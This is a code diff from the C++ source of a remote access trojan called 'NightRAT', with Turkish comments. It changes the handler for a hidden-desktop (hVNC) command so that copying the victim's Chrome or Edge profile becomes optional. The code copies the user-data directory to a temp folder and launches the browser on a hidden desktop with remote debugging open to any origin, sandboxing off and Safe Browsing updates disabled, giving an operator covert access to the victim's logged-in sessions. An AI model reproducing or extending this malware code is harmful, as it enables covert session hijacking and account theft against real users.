@@ -1559,12 +1559,13 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
         } else if (action == "hvnc_run") {
             string requestedPath = cmd.value("path", "cmd.exe");
             wstring wRequestedPath = utf8_to_wstring(requestedPath);
+            bool copyProfile = cmd.value("copy_profile", false);
 
             bool isBrowser = (wRequestedPath == L"Google Chrome" ||
                               wRequestedPath == L"Microsoft Edge");
 
             if (isBrowser) {
-                thread([wRequestedPath]() {
+                thread([wRequestedPath, copyProfile]() {
                     ensure_desktop();
                     if (!g_hHiddenDesktop) return;
 
@@ -1578,80 +1579,83 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         return;
                     }
 
-                    wstring sourceUserData = get_browser_profile_path(wRequestedPath);
-                    if (sourceUserData.empty()) {
-                        send_error("User Data directory not found.");
-                        return;
-                    }
-
-                    wchar_t tempPath[MAX_PATH];
-                    GetTempPathW(MAX_PATH, tempPath);
-                    wstring profilePath = tempPath;
-                    profilePath += L"NightRAT_";
-                    profilePath += exeName;
-                    profilePath += L"_Profile";
-
-                    // Mevcut kopya varsa temizle
-                    try {
-                        if (fs::exists(profilePath)) fs::remove_all(profilePath);
-                    } catch (...) {}
-
-                    send_status("Profiller kopyalanıyor...");
-                    if (!copy_recursive(fs::path(sourceUserData), fs::path(profilePath))) {
-                        send_error("Failed to copy browser profile.");
-                        return;
-                    }
-
-                    // İlk profili tespit et (Default veya Profile 1)
+                    wstring profilePath;
                     wstring profileDir = L"Default";
-                    WIN32_FIND_DATAW findData;
-                    HANDLE hFind = FindFirstFileW((sourceUserData + L"\\*").c_str(), &findData);
-                    if (hFind != INVALID_HANDLE_VALUE) {
-                        do {
-                            wstring name = findData.cFileName;
-                            if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
-                                (name == L"Default" || name.find(L"Profile ") == 0)) {
-                                profileDir = name;
-                                break;
-                            }
-                        } while (FindNextFileW(hFind, &findData));
-                        FindClose(hFind);
+
+                    if (copyProfile) {
+                        wstring sourceUserData = get_browser_profile_path(wRequestedPath);
+                        if (sourceUserData.empty()) {
+                            send_error("User Data directory not found.");
+                            return;
+                        }
+
+                        wchar_t tempPath[MAX_PATH];
+                        GetTempPathW(MAX_PATH, tempPath);
+                        profilePath = tempPath;
+                        profilePath += L"NightRAT_";
+                        profilePath += exeName;
+                        profilePath += L"_Profile";
+
+                        // Mevcut kopya varsa temizle
+                        try {
+                            if (fs::exists(profilePath)) fs::remove_all(profilePath);
+                        } catch (...) {}
+
+                        send_status("Profiller kopyalanıyor...");
+                        if (!copy_recursive(fs::path(sourceUserData), fs::path(profilePath))) {
+                            send_error("Failed to copy browser profile.");
+                            return;
+                        }
+
+                        // İlk profili tespit et (Default veya Profile 1)
+                        WIN32_FIND_DATAW findData;
+                        HANDLE hFind = FindFirstFileW((sourceUserData + L"\\*").c_str(), &findData);
+                        if (hFind != INVALID_HANDLE_VALUE) {
+                            do {
+                                wstring name = findData.cFileName;
+                                if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
+                                    (name == L"Default" || name.find(L"Profile ") == 0)) {
+                                    profileDir = name;
+                                    break;
+                                }
+                            } while (FindNextFileW(hFind, &findData));
+                            FindClose(hFind);
+                        }
                     }
 
                     send_status("Tarayıcı başlatılıyor...");
 
                     // Modern Chromium tarayıcılar için görünürlüğü ve kararlılığı artıran bayraklar
-                    wstring args = L" --remote-debugging-port=9222"
-                                   //L" --user-data-dir=\"" + profilePath + L"\""
-                                   //L" --profile-directory=\"" + profileDir + L"\""
-                                   L" --no-sandbox"
-                                   L" --disable-gpu"
-                                   L" --window-size=1280,720"
-                                   L" --window-position=0,0"
-                                   L" --no-first-run"
-                                   L" --no-default-browser-check"
-                                   L" --disable-background-networking"
-                                   L" --disable-sync"
-                                   L" --disable-translate"
-                                   L" --metrics-recording-only"
-                                   L" --safebrowsing-disable-auto-update"
-                                   L" --disable-setuid-sandbox"
-                                   L" --disable-infobars"
-                                   L" --disable-gpu-compositing"
-                                   L" --force-cpu-draw"
-                                   //L" --disable-features=AppBoundEncryption,AppBoundEncryptionRequired,LockProfile,CalculateNativeWinOcclusion,RendererCodeIntegrity"
-                                   //L" --password-store=basic"
-                                   L" --disable-encryption-win"
-                                   L" --restore-last-session"
-                                   //L" --allow-profiles-outside-user-dir"
-                                   L" --no-pings"
-                                   L" --disable-notifications"
-                                   L" --disable-component-update"
-                                   L" --disable-blink-features=AutomationControlled"
-                                   L" --disable-backgrounding-occluded-windows"
-                                   L" --disable-renderer-backgrounding"
-                                   L" --remote-allow-origins=*"
-                                   L" --lang=en-US";
+                    wstring args = L" --remote-debugging-port=9222";
+                    if (copyProfile) {
+                        args += L" --user-data-dir=\"" + profilePath + L"\"";
+                        args += L" --profile-directory=\"" + profileDir + L"\"";
+                    }
+                    args += L" --no-sandbox"
+                            L" --disable-gpu"
+                            L" --window-size=1280,720"
+                            L" --window-position=0,0"
+                            L" --no-first-run"
+                            L" --no-default-browser-check"
+                            L" --disable-background-networking"
+                            L" --disable-sync"
+                            L" --disable-translate"
+                            L" --metrics-recording-only"
+                            L" --safebrowsing-disable-auto-update"
+                            L" --disable-setuid-sandbox"
+                            L" --disable-infobars"
+                            L" --disable-gpu-compositing"
+                            L" --force-cpu-draw"
+                            L" --disable-encryption-win"
+                            L" --restore-last-session"
+                            L" --no-pings"
+                            L" --disable-notifications"
+                            L" --disable-component-update"
+                            L" --disable-blink-features=AutomationControlled"
+                            L" --disable-backgrounding-occluded-windows"
+                            L" --disable-renderer-backgrounding"
+                            L" --remote-allow-origins=*"
+                            L" --lang=en-US";
 
                     wstring fullCmd = L"\"" + exePath + L"\"" + args;
                     vector<wchar_t> cmdLine(fullCmd.begin(), fullCmd.end());
